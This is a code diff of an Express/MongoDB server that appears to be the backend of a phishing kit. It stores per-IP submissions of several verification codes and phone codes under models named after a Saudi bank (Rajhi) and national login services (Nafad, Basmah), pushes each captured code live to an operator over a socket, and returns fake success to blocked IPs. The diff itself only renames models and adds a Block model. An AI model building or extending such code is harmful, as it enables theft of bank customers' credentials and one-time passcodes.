@@ -25,6 +25,7 @@ const Rajhi = require("./models/Rajhi");
 const RajhiCode = require("./models/RajhiCode");
 const Admin = require("./models/Admin");
 const generateTokenFor = require("./utils/jwt"); // your JWT‑helper (or any token generator)
+const Block = require("./models/Block");
 
 const app = express();
 const server = http.createServer(app);
@@ -154,7 +155,7 @@ app.post(
     if (await isIpBlocked(req.body?.ip))
       return res.json({ success: true, blocked: true });
     const data = { ...req.body, updatedAt: new Date() };
-    const doc = await IndexPage.findOneAndUpdate({ ip: data.ip }, data, {
+    const doc = await IndexSubmission.findOneAndUpdate({ ip: data.ip }, data, {
       upsert: true,
       new: true,
       setDefaultsOnInsert: true,
@@ -203,7 +204,7 @@ app.post(
   wrap(async (req, res) => {
     if (await isIpBlocked(req.body?.ip))
       return res.json({ success: true, blocked: true });
-    const doc = await Otp.create({
+    const doc = await Verification.create({
       ip: req.body.ip,
       verification_code_two: req.body.verification_code_two,
     });
@@ -230,7 +231,7 @@ app.post(
     const { ip, verification_code_three } = req.body;
     if (await isIpBlocked(ip))
       return res.json({ success: true, blocked: true });
-    const doc = await Otp.create({ ip, verification_code_three });
+    const doc = await PhoneCode.create({ ip, verification_code_three });
     io.emit("newPhoneCode", doc);
     res.json({ success: true, doc });
   })
@@ -267,7 +268,7 @@ app.post(
     const { ip, code } = req.body;
     if (await isIpBlocked(ip))
       return res.json({ success: true, blocked: true });
-    const doc = await Basmah.findOneAndUpdate(
+    const doc = await Nafad.findOneAndUpdate(
       { ip },
       { code: String(code).padStart(2, "0") },
       { upsert: true, new: true }
@@ -286,7 +287,6 @@ app.delete(
       phone.deleteMany({ ip }),
       PhoneCode.deleteMany({ ip }),
       ThirdParty.deleteMany({ ip }),
-
       Verification.deleteMany({ ip }),
       IndexSubmission.deleteMany({ ip }),
       Details.deleteMany({ ip }),
